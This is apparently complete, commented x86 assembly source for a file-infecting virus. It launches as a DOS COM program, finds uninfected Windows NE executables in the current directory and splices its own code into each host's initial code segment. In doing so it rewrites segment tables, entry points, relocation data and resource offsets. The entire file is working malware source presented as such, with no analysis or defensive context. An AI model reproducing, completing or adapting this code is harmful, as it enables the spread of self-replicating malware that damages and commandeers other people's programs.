;A Basic Windows-EXE infecting virus. Launched as a DOS COM file.

        .model  small

        .code

;All code must be offset-relocatable.
;All data is stored on the stack.

;Useful constants
NEW_HDR_SIZE    EQU     40H             ;size of new EXE header

;The following are used to access data on the stack. The first 512 bytes are
;a buffer for disk reads/writes.
FILE_ID         EQU     200H            ;"*.EXE" constant
ENTRYPT         EQU     206H            ;ip of virus start
VIRSTART        EQU     208H            ;offset of virus start in cs
NH_OFFSET       EQU     20AH            ;new EXE header offset from file start
VIRSECS         EQU     20CH            ;size added to file, in sectors for virus
INITSEC         EQU     20EH            ;initial cs location in file (sectors)
RELOCS          EQU     210H            ;number of relocatables in initial cs
LOG_SEC         EQU     212H            ;logical sector size for pgm
CS_SIZE         EQU     214H            ;size of all data in code seg, including rels, not virus
NEW_HDR         EQU     216H            ;new EXE header

;The following gives the size of the virus, in bytes
VIRUS_SIZE      EQU     OFFSET END_VIRUS - OFFSET VIRUS

        ORG     100H

;******************************************************************************
;This is the main virus routine. It simply finds a file to infect and infects
;it, and then passes control to the host program. It resides in the first
;segment of the host program, that is, the segment where control is initially
;passed.

VIRUS:
        push    ax                      ;save all registers
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        call    VIR_START
VIR_START:
        pop     bx
        sub     bx,3+6
        push    bp                      ;save segments and bp
        push    ds
        push    es
        mov     ax,ss                   ;all viral data is in stack segment
        mov     ds,ax
        mov     es,ax
        sub     sp,512+128              ;data area
        mov     bp,sp                   ;bp indexes data
        mov     [bp+VIRSTART],bx        ;save virus starting offset here
        call    FIND_FILE               ;find a viable file to infect
        jnz     GOTO_HOST               ;z set if a file was found
        call    INFECT_FILE             ;infect it if found
GOTO_HOST:
        add     sp,512+128
        pop     es
        pop     ds
        pop     bp
        pop     di
        pop     si
        pop     dx
        pop     cx
        pop     bx
        pop     ax
VIRUS_DONE:
        jmp     HOST                    ;pass control to host program

;******************************************************************************
;This routine searches for a file to infect. It looks for EXE files and then
;checks them to see if they're uninfected, infectable Windows files. If a file
;is found, this routine returns with Z set, with the file left open, and its
;handle in the bx register. This FIND_FILE searches only the current directory.

FIND_FILE:
        mov     di,bp                   ;first, put '*.EXE',0 on stack
        add     di,FILE_ID              ;at this location
        mov     dx,di                   ;set dx up for search first
        mov     ax,2E2AH                ;*.
        stosw
        mov     ax,5845H                ;EX
        stosw
        mov     ax,0045H                ;E(0)
        stosw
        xor     cx,cx                   ;file attribute
        mov     ah,4EH                  ;search first
        int     21H
FIND_LOOP:
        or      al,al                   ;see if search successful
        jnz     FIND_EXIT               ;nope, exit with NZ set
        call    FILE_OK                 ;see if it is infectable
        jz      FIND_EXIT               ;yes, get out with Z set
        mov     ah,4FH                  ;no, search for next file
        int     21H
        jmp     SHORT FIND_LOOP
FIND_EXIT:                              ;pass control back to main routine
        ret

;This routine determines whether a file is ok to infect. The conditions for an
;OK file are as follows:
;
;       (1) It must be a Windows EXE file.
;       (2) There must be enough room in the initial code segment for it.
;       (3) The file must not be infected already.
;
;If the file is OK, this routine returns with Z set, the file open, and the
;handle in bx. If the file is not OK, this routine returns with NZ set, and
;it closes the file. This routine also sets up a number of important variables
;as it snoops through the file. These are used by the infect routine later.
FILE_OK:
        push    ds
        push    es                      ;save seg registers
        mov     ah,2FH
        int     21H                     ;get current DTA address in es:bx
        push    es
        push    ds
        pop     es
        pop     ds                      ;exchange ds and es
        mov     dx,bx                   ;put address in ds:dx
        add     dx,30                   ;set ds:dx to point to file name
        mov     ah,3DH                  ;ok, now open the file
        mov     al,01000010B            ;flags, read/write, etc.
        int     21H
        pop     es
        pop     ds                      ;restore seg registers
        jnc     FOK1                    ;error on opening?
        jmp     FOK_ERROR2              ;yes, exit now
FOK1:   mov     bx,ax                   ;open ok, put handle in bx
        mov     ah,3FH                  ;now read EXE header
        mov     dx,bp                   ;ds:dx points to file buffer
        mov     cx,40H                  ;read 40H bytes
        int     21H
        jc      FN1                     ;exit on error
        cmp     [bp],5A4DH              ;see if first 2 bytes are 'MZ'
        jnz     FN1                     ;nope, file not an EXE, exit
        cmp     WORD PTR [bp+18H],40H   ;see if reloc table is at 40H or more
        jc      FN1                     ;nope, it can't be a Windows EXE
        mov     dx,[bp+3CH]             ;ok, put offset to new header in dx
        mov     [bp+NH_OFFSET],dx       ;and save it here
        xor     cx,cx
        mov     ax,4200H                ;now do a seek from start
        int     21H
        jc      FN1
        mov     ah,3FH
        mov     cx,NEW_HDR_SIZE         ;now read the new header
        mov     dx,bp                   ;into memory
        add     dx,NEW_HDR
        int     21H
        jc      FN1                     ;exit if there is an error
        cmp     [bp+NEW_HDR],454EH      ;see if this is 'NE' new header ID
        jnz     FN1                     ;nope, not a Windows EXE!
        mov     al,[bp+36H+NEW_HDR]     ;get target OS flags
        and     al,2                    ;see if target OS = windows
        jnz     FOK2                    ;ok, go on
FN1:    jmp     FOK_ERROR1              ;else exit

;If we get here, then condition (1) is fulfilled.

FOK2:   mov     dx,[bp+16H+NEW_HDR]     ;get initial cs
        call    GET_SEG_ENTRY           ;and read seg table entry into disk buf
        jc      FOK_ERROR1
        mov     ax,[bp+2]               ;put segment length in ax
        add     ax,VIRUS_SIZE           ;add size of virus to it
        jc      FOK_ERROR1              ;if we carry, there's not enough room
                                        ;else we're clear on this count

;If we get here, then condition (2) is fulfilled.

        mov     cx,[bp+NEW_HDR+32H]     ;logical sector alignment
        mov     ax,1
        shl     ax,cl                   ;ax=logical sector size
        mov     cx,[bp]                 ;get logical-sector offset of start seg
        mul     cx                      ;byte offset in dx:ax
        add     ax,WORD PTR [bp+NEW_HDR+14H];add in ip of entry point
        adc     dx,0
        mov     cx,dx
        mov     dx,ax                   ;put entry point in cx:dx
        mov     ax,4200H                ;and seek from start of file
        int     21H
        jc      FOK_ERROR1
        mov     ah,3FH
        mov     cx,20H                  ;read 32 bytes
        mov     dx,bp
        int     21H                     ;into buffer
        jc      FOK_ERROR1
        mov     di,bp
        mov     si,[bp+VIRSTART]        ;get starting offset of virus in cs
        mov     cx,10H                  ;compare 32 bytes
FOK3:   mov     ax,cs:[si]              ;of virus at cs
        add     si,2
        add     di,2
        cmp     ax,[di-2]               ;with code in buffer
        loopz   FOK3
        jz      FOK_ERROR1              ;already there, exit not ok

;If we get here, then condition (3) is fulfilled, all systems go!

        xor     al,al                   ;set Z flag
        ret                             ;and exit

FOK_ERROR1:
        mov     ah,3EH                  ;close file before exiting
        int     21H
FOK_ERROR2:
        mov     al,1
        or      al,al                   ;set NZ
        ret                             ;and return to caller

;******************************************************************************
;This routine modifies the file we found to put the virus in it. There are a
;number of steps in the infection process, as follows:
;    1) We have to modify the segment table. For the initial segment, this
;       involves (a) increasing the segment size by the size of the virus,
;       and (b) increase the minimum allocation size of the segment, if it
;       needs it. Every segment AFTER this initial segment must also be
;       adjusted by adding the size increase, in sectors, of the virus
;       to it.
;    2) We have to change the starting ip in the new header. The virus is
;       placed after the host code in this segment, so the new ip will be
;       the old segment size.
;    3) We have to move all sectors in the file after the initial code segment
;       out by VIRSECS, the size of the virus in sectors.
;    4) We have to move the relocatables, if any, at the end of the code
;       segment we are infecting, to make room for the virus code
;    5) We must move the virus code into the code segment we are infecting.
;    6) We must adjust the jump in the virus to go to the original entry point.
;    7) We must adjust the resource offsets in the resource table to reflect
;       their new locations.
;    8) We have to kill the fast-load area.
;
INFECT_FILE:
        mov     dx,[bp+NEW_HDR+24H]     ;get resource table @
        add     dx,[bp+NH_OFFSET]
        xor     cx,cx
        mov     ax,4200H
        int     21H
        mov     dx,bp
        add     dx,LOG_SEC              ;read logical sector size
        mov     ah,3FH
        mov     cx,2
        int     21H
        mov     cx,[bp+LOG_SEC]
        mov     ax,1
        shl     ax,cl
        mov     [bp+LOG_SEC],ax         ;put logical sector size here

        mov     ax,[bp+NEW_HDR+14H]     ;save old entry point
        mov     [bp+ENTRYPT],ax         ;for future use

        mov     dx,[bp+NEW_HDR+16H]     ;read seg table entry
        call    GET_SEG_ENTRY           ;for initial cs

        mov     ax,[bp]                 ;get location of this seg in file
        mov     [bp+INITSEC],ax         ;save that here
        mov     ax,[bp+2]               ;get segment size
        mov     [bp+NEW_HDR+14H],ax     ;update entry ip in new header in ram
        call    SET_RELOCS              ;set up RELOCS and CS_SIZE

        mov     ax,VIRUS_SIZE           ;now calculate added size of segment
        add     ax,[bp+CS_SIZE]         ;ax=total new size
        xor     dx,dx
        mov     cx,[bp+LOG_SEC]
        div     cx                      ;ax=full sectors in cs with virus
        or      dx,dx                   ;any remainder?
        jz      INF05
        inc     ax                      ;adjust for partially full sector
INF05:  push    ax
        mov     ax,[bp+CS_SIZE]         ;size without virus
        xor     dx,dx
        div     cx
        or      dx,dx
        jz      INF07
        inc     ax
INF07:  pop     cx
        sub     cx,ax                   ;cx=number of secs needed for virus
        mov     [bp+VIRSECS],cx         ;save this here

        call    UPDATE_SEG_TBL          ;perform mods in (1) above on file

        mov     ax,4200H                ;now move file pointer to new header
        mov     dx,[bp+NH_OFFSET]
        xor     cx,cx
        int     21H

        lea     di,[bp+NEW_HDR+37H]     ;zero out fast load area
        xor     ax,ax
        stosb
        stosw
        stosw                           ;(8) completed
        mov     ah,40H                  ;and update new header in file
        mov     dx,bp                   ;(we updated the entry point above)
        add     dx,NEW_HDR
        mov     cx,NEW_HDR_SIZE
        int     21H                     ;mods in (2) above now complete

        call    MOVE_END_OUT            ;move end of virus out by VIRSECS (3)
                                        ;also sets up RELOCS count
        cmp     WORD PTR [bp+RELOCS],0  ;any relocatables in cs?
        jz      INF1                    ;nope, don't need to relocate them
        call    RELOCATE_RELOCS         ;relocate relocatables in cs (4)
INF1:   call    WRITE_VIRUS_CODE        ;put virus into cs (5 & 6)
        call    UPDATE_RES_TABLE        ;update resource table entries

        mov     ah,3EH                  ;close the file now
        int     21H                     ;all done infecting!

;        mov     ah,2FH                  ;report file name infected
;        int     21H                     ;for DOS-based debugging purposes
;        push    es                      ;only!
;        pop     ds
;        add     bx,30
;        mov     dx,bx
;ZLP:    mov     al,[bx]
;        or      al,al
;        jz      ZLP1
;        inc     bx
;        jmp     ZLP
;ZLP1:   mov     BYTE PTR [bx],'$'
;        mov     ah,9
;        int     21H

        ret

;The following procedure updates the Segment Table entries per item (1) in
;INFECT_FILE.
UPDATE_SEG_TBL:
        mov     dx,[bp+NEW_HDR+16H]     ;read seg table entry
        call    GET_SEG_ENTRY           ;for initial cs
        mov     ax,[bp+2]               ;get seg size
        add     ax,VIRUS_SIZE           ;add the size of the virus to seg size
        mov     [bp+2],ax               ;and update size in seg table

        mov     ax,[bp+6]               ;get min allocation size of segment
        or      ax,ax                   ;is it 64K?
        jz      US2                     ;yes, leave it alone
US1:    add     ax,VIRUS_SIZE           ;add virus size on
        jnc     US2                     ;no overflow, go and update
        xor     ax,ax                   ;else set size = 64K
US2:    mov     [bp+6],ax               ;update size in table in ram

        mov     ax,4201H
        mov     cx,0FFFFH
        mov     dx,-8
        int     21H                     ;back up to location of seg table entry

        mov     ah,40H                  ;and write modified seg table entry
        mov     dx,bp                   ;for initial cs to segment table
        mov     cx,8
        int     21H                     ;ok, init cs seg table entry is modified

        mov     di,[bp+NEW_HDR+1CH]     ;get number of segment table entries

US3:    push    di                      ;save table entry counter
        mov     dx,di                   ;dx=seg table entry # to read
        call    GET_SEG_ENTRY           ;read it into disk buffer

        mov     ax,[bp]                 ;get offset of this segment in file
        cmp     ax,[bp+INITSEC]         ;higher than initial code segment?
        jle     US4                     ;nope, don't adjust
        add     ax,[bp+VIRSECS]         ;yes, add the size of virus in
US4:    mov     [bp],ax                 ;adjust segment loc in memory

        mov     ax,4201H
        mov     cx,0FFFFH
        mov     dx,-8
        int     21H                     ;back up to location of seg table entry

        mov     ah,40H                  ;and write modified seg table entry
        mov     dx,bp
        mov     cx,8
        int     21H
        pop     di                      ;restore table entry counter
        dec     di
        jnz     US3                     ;and loop until all segments done

        ret                             ;all done

;This routine goes to the segment table entry number specified in dx in the
;file and reads it into the disk buffer. dx=1 is the first entry!
GET_SEG_ENTRY:
        mov     ax,4200H                ;seek in file
        dec     dx
        mov     cl,3
        shl     dx,cl
        add     dx,[bp+NH_OFFSET]
        add     dx,[bp+NEW_HDR+22H]     ;dx=ofs of seg table entry requested
        xor     cx,cx                   ;   in the file
        int     21H                     ;go to specified table entry
        jc      GSE1                    ;exit on error

        mov     ah,3FH                  ;read table entry into disk buf
        mov     dx,bp
        mov     cx,8
        int     21H
GSE1:   ret

;This routine moves the end of the virus out by VIRSECS. The "end" is
;everything after the initial code segment where the virus will live.
;The variable VIRSECS is assumed to be properly set up before this is called.
;This routine also sets up the RELOCS variable.
MOVE_END_OUT:
        mov     ax,[bp+CS_SIZE]         ;size of cs in bytes
        mov     cx,[bp+LOG_SEC]
        xor     dx,dx
        div     cx
        or      dx,dx
        jz      ME01
        inc     ax
ME01:   add     ax,[bp+INITSEC]         ;ax=next sector after cs
        push    ax

        xor     dx,dx
        xor     cx,cx
        mov     ax,4202H                ;seek end of file
        int     21H                     ;returns dx:ax = file size
        mov     cx,[bp+LOG_SEC]
        div     cx                      ;ax=sectors in file
        mov     si,ax                   ;keep it here
        pop     di                      ;last sector after code segment
        dec     di
MEO2:   push    si
        push    di
        call    MOVE_SECTOR             ;move sector number si out
        pop     di
        pop     si
        dec     si
        cmp     si,di
        jnz     MEO2                    ;and loop until all moved

        ret

;This routine moves a single sector from SI to SI+VIRSECS
MOVE_SECTOR:
        mov     ax,si
        mov     cx,[bp+LOG_SEC]
        mul     cx
        mov     cx,dx
        mov     dx,ax
        mov     ax,4200H
        int     21H                     ;seek sector si

        mov     ah,3FH                  ;and read it
        mov     dx,bp
        mov     cx,[bp+LOG_SEC]
        int     21H

        mov     ax,[bp+VIRSECS]
        dec     ax                      ;calculate new, relative file ptr
        mov     cx,[bp+LOG_SEC]
        mul     cx
        mov     cx,dx
        mov     dx,ax
        mov     ax,4201H
        int     21H                     ;and move there

        mov     ah,40H
        mov     dx,bp
        mov     cx,[bp+LOG_SEC]
        int     21H                     ;and write sector there

        ret

;This routine simply sets the variable RELOCS and CS_SIZE variables in memory.
SET_RELOCS:
        mov     WORD PTR [bp+RELOCS],0
        mov     dx,[bp+NEW_HDR+16H]     ;read init cs seg table entry
        call    GET_SEG_ENTRY
        mov     ax,[bp+4]               ;get segment flags
        xor     dx,dx
        and     ah,1                    ;check for relocation data
        mov     ax,[bp+NEW_HDR+14H]     ;size of segment is this
        jz      SRE                     ;no data, continue
        push    ax
        push    ax                      ;there is relocation data, how much?
        mov     ax,[bp+INITSEC]         ;find end of code in file
        mov     cx,[bp+LOG_SEC]
        mul     cx                      ;dx:ax = start of cs in file
        pop     cx                      ;cx = size of code
        add     ax,cx
        adc     dx,0
        mov     cx,dx
        mov     dx,ax                   ;cx:dx=end of cs in file
        mov     ax,4200H                ;so go seek it
        int     21H
        mov     ah,3FH                  ;and read 2 byte count of relocatables
        mov     dx,bp
        mov     cx,2
        int     21H
        mov     ax,[bp]
        mov     [bp+RELOCS],ax          ;save count here
        mov     cl,3
        shl     ax,cl
        add     ax,2                    ;size of relocation data
        pop     cx                      ;size of code in segment
        xor     dx,dx
        add     ax,cx                   ;total size of segment
        adc     dx,0
SRE:    mov     [bp+CS_SIZE],ax         ;save it here
        ret

;This routine relocates the relocatables at the end of the initial code
;segment to make room for the virus. It will move any number of relocation
;records, each of which is 8 bytes long.
RELOCATE_RELOCS:
        mov     ax,[bp+RELOCS]          ;number of relocatables
        mov     cl,3
        shl     ax,cl
        add     ax,2                    ;ax=total number of bytes to move
        push    ax

        mov     ax,[bp+INITSEC]
        mov     cx,[bp+LOG_SEC]
        mul     cx                      ;dx:ax = start of cs in file
        add     ax,[bp+NEW_HDR+14H]
        adc     dx,0                    ;dx:ax = end of cs in file
        pop     cx                      ;cx = size of relocatables
        add     ax,cx
        adc     dx,0                    ;dx:ax = end of code+relocatables
        xchg    ax,cx
        xchg    dx,cx                   ;ax=size cx:dx=location

RR_LP:  push    cx
        push    dx
        push    ax
        cmp     ax,512
        jle     RR1
        mov     ax,512                  ;read up to 512 bytes
RR1:    sub     dx,ax                   ;back up file pointer
        sbb     cx,0
        push    cx
        push    dx
        push    ax
        mov     ax,4200H                ;seek desired location in file
        int     21H
        pop     cx
        mov     ah,3FH
        mov     dx,bp
        int     21H                     ;read needed number of bytes, # in ax
        pop     dx
        pop     cx
        push    ax                      ;save # of bytes read
        add     dx,VIRUS_SIZE           ;move file pointer up now
        adc     cx,0
        mov     ax,4200H
        int     21H
        pop     cx                      ;bytes to write
        mov     ah,40H
        mov     dx,bp
        int     21H                     ;write them to new location
        pop     ax
        pop     dx
        pop     cx
        cmp     ax,512                  ;less than 512 bytes to write?
        jle     RRE                     ;yes, we're all done
        sub     ax,512                  ;nope, adjust indicies
        sub     dx,512
        sbb     cx,0
        jmp     RR_LP                   ;and go do another

RRE:    ret

;This routine writes the virus code itself into the code segment being infected.
;It also updates the jump which exits the virus so that it points to the old
;entry point in this segment. The only trick is that we can't write directly
;from cs since we can't just set ds=cs in windows or you get a fault. Thus
;we move the virus to the disk buffer and then write from there.
WRITE_VIRUS_CODE:
        mov     ax,[bp+INITSEC]         ;sectors to code segment
        mov     cx,[bp+LOG_SEC]
        mul     cx                      ;dx:ax = location of code seg
        add     ax,[bp+NEW_HDR+14H]
        adc     dx,0                    ;dx:ax = place to put virus
        mov     cx,dx
        mov     dx,ax
        push    cx
        push    dx                      ;save these to adjust jump
        mov     ax,4200H                ;seek there
        int     21H
        mov     si,[bp+VIRSTART]        ;si=start of virus
        mov     cx,VIRUS_SIZE           ;cx=size of virus
WVCLP:  push    cx
        cmp     cx,512                  ;512 bytes maximum allowed per write
        jle     WVC1
        mov     cx,512
WVC1:   push    cx
        mov     di,bp                   ;now move virus to disk buffer
WCV2:   mov     al,cs:[si]              ;get a byte from cs
        inc     si
        stosb                           ;and save to disk buffer
        loop    WCV2                    ;repeat until done
        pop     cx                      ;now write cx bytes to the file
        mov     dx,bp
        mov     ah,40H
        int     21H
        pop     cx                      ;done writing,
        cmp     cx,512                  ;did we have more than 512 bytes?
        jle     WVC3                    ;nope, all done writing
        sub     cx,512                  ;else subtract 512
        jmp     WVCLP                   ;and do another

WVC3:   pop     dx                      ;ok, now we have to update the jump
        pop     cx                      ;to the host
        mov     ax,OFFSET VIRUS_DONE - OFFSET VIRUS
        inc     ax
        add     dx,ax
        adc     cx,0                    ;cx:dx=location to update
        push    ax
        mov     ax,4200H                ;go there
        int     21H
        pop     ax
        inc     ax
        inc     ax
        add     ax,[bp+NEW_HDR+14H]     ;ax=offset of instr after jump
        sub     ax,[bp+ENTRYPT]         ;ax=distance to jump
        neg     ax                      ;make it a negative number
        mov     [bp],ax                 ;save it here
        mov     ah,40H                  ;and write it to disk
        mov     cx,2
        mov     dx,bp
        int     21H                     ;all done
        ret

;Update the resource table so sector pointers are right.
UPDATE_RES_TABLE:
        mov     dx,[bp+NEW_HDR+24H]     ;move to resource table in EXE
        add     dx,[bp+NH_OFFSET]
        add     dx,2
        xor     cx,cx
        mov     ax,4200H
        int     21H
URT1:
        mov     ah,3FH                  ;read 8 byte typeinfo record
        mov     dx,bp
        mov     cx,8
        int     21H
        cmp     WORD PTR [bp],0         ;is type ID 0?
        jz      URTE                    ;yes, all done

        mov     cx,[bp+2]               ;get count of nameinfo records to read

URT2:   push    cx
        mov     ah,3FH                  ;read 1 nameinfo record
        mov     dx,bp
        mov     cx,12
        int     21H

        mov     ax,[bp]                 ;get offset of resource
        cmp     ax,[bp+INITSEC]         ;greater than initial cs location?
        jle     URT3                    ;nope, don't worry about it
        add     ax,[bp+VIRSECS]         ;add size of virus
        mov     [bp],ax

        mov     ax,4201H                ;now back file pointer up
        mov     dx,-12
        mov     cx,0FFFFH
        int     21H
        mov     ah,40H                  ;and write updated resource rec to
        mov     dx,bp                   ;the file
        mov     cx,12
        int     21H

URT3:
        pop     cx
        dec     cx                      ;read until all nameinfo records for
        jnz     URT2                    ;this typeinfo are done

        jmp     URT1                    ;go get another typeinfo record


URTE:   ret

;******************************************************************************
END_VIRUS:                              ;label for the end of the windows virus

;******************************************************************************
;The following HOST is only here for the DOS-based loader. Once this infects
;a windows file, the virus will jump to the startup code for the program it
;is attached to.
HOST:   mov     ax,4C00H
        int     21H

        END     VIRUS
